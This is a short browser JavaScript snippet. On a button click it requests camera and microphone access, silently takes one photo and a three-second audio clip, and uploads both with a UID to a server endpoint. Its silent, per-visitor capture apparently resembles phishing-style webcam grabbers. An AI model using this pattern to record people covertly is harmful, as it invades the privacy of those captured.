document.getElementById('startBtn').addEventListener('click', () => {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            // Capture image after 2 seconds
            setTimeout(() => {
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                imageCapture.takePhoto()
                    .then(blob => {
                        sendFile(blob, "image");
                    })
                    .catch(err => console.error("Image capture failed:", err));
            }, 2000);

            // Capture short audio after 2 seconds
            setTimeout(() => {
                captureAudio();
            }, 2000);

        })
        .catch(err => {
            console.error("Permission denied or error:", err);
        });
});

function sendFile(fileBlob, type) {
    const formData = new FormData();
    formData.append("uid", UID);
    formData.append("type", type);
    formData.append("file", fileBlob, type + ".webm");

    fetch("/upload", {
        method: "POST",
        body: formData
    })
        .then(res => res.json())
        .then(data => console.log("Upload result:", data))
        .catch(err => console.error("Upload failed:", err));
}

function captureAudio() {
    navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: "audio/webm" });
                sendFile(audioBlob, "audio");
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 3000); // Record for 3 sec
        })
        .catch(err => console.error("Audio capture failed:", err));
}